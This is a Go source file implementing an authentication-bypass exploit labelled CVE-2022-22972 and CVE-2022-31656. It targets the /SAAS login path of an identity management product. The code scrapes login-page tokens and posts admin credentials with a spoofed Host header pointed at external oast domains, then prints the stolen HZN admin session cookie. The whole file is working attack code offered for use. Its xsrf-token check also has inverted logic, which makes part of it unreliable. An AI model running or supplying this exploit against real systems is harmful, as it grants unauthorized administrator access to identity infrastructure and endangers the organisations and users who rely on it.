package c22972

/* cve-2022-31656 too*/
import (
	"fmt"
	"github.com/imroc/req/v3"
	"os"
	"regexp"
	"strings"
	"time"
)

func Start(url, host, cve string) {
	if cve == "22972" {
		uri_cve = "/SAAS/auth/login/embeddedauthbroker/callback"
	} else if cve == "31656" {
		uri_cve = "/SAAS/t/_/;/auth/login/embeddedauthbroker/callback"
	}
	Exploit(url, host)
}

var uri_cve = ""
var Proxy_server = ""

func retry(client *req.Request, url string) {
	login, err := client.Post(url + uri_cve)
	if err != nil {
		println("[-] Connection err, please check the network.")
		os.Exit(0)
		// log.Fatal(err)
	}

	cookies := login.Cookies()
	if len(cookies) > 1 && login.StatusCode == 302 {

	} else {
		println("[-] Exploitation failure.")
	}

	for i := 0; i < len(cookies); i++ {
		if cookies[i].Name == "HZN" {
			println(cookies[i].Value)
			os.Exit(0)
		}
	}
}

func Exploit(url, host string) {
	client := req.C()
	client.EnableForceHTTP1()
	client.SetCommonHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36")
	client.EnableInsecureSkipVerify()
	client.SetProxyURL(Proxy_server)
	client.SetTimeout(18 * time.Second)
	client.SetRedirectPolicy(req.NoRedirectPolicy())
	resp, err := client.
		R().
		Get(url + "/SAAS/auth/login")
	if err != nil {
		println("[-] Connection err, please check the network.")
		os.Exit(0)

	}

	content := resp.String()
	xsrf_token := ""
	if len(resp.Cookies()) <= 1 {
		xsrf_token = resp.Cookies()[1].Value
	} else {
		fmt.Println("[-] Failed to get xsrf token...")
		os.Exit(0)
	}

	data := map[string]string{
		"protected_state":   "e" + getprotectState(content),
		"userStoreName":     "System Domain",
		"username":          "admin",
		"password":          "123",
		"userstoreDisplay":  "System Domain",
		"horizonRelayState": gethorizonRelayState(content),
		"stickyConnectorId": "",
		"acion":             "signIn",
		"LOGIN_XSRF":        xsrf_token,
	}
	domain := []string{"oast.online", "oast.pro", "oast.fun"}

	rec := client.R().
		SetFormData(data)
	if len(host) == 0 {
		client.SetTimeout(15 * time.Second)
		for _, value := range domain {
			fmt.Println("[*] Use domain: " + value)
			rec.SetHeader("Host", value)
			retry(rec, url)
		}
	} else {
		rec.SetHeader("Host", host)
		retry(rec, url)
	}

}

func gethorizonRelayState(conntent string) string {
	reg := regexp.MustCompile(`"horizonRelayState" value="(.*)/>`)
	res := reg.FindAllString(conntent, -1)
	horizonRelayState := strings.TrimLeft(res[0], `"horizonRelayState" value="`)
	horizonRelayState = strings.TrimRight(horizonRelayState, `"/>`)
	// fmt.Println(horizonRelayState)
	return horizonRelayState

}

func getprotectState(content string) string {
	reg := regexp.MustCompile(`"protected_state" value="(.*)"/>`)
	res := reg.FindAllString(content, -1)
	// fmt.Print(res[0] + "\n")
	protected_state := strings.TrimLeft(res[0], `"protected_state" value="`)
	// fmt.Println(protected_state + "qq")
	protected_state = strings.TrimRight(protected_state, `"/>`)
	// fmt.Println("---------------------------\n")
	// fmt.Println(protected_state)
	return protected_state
}
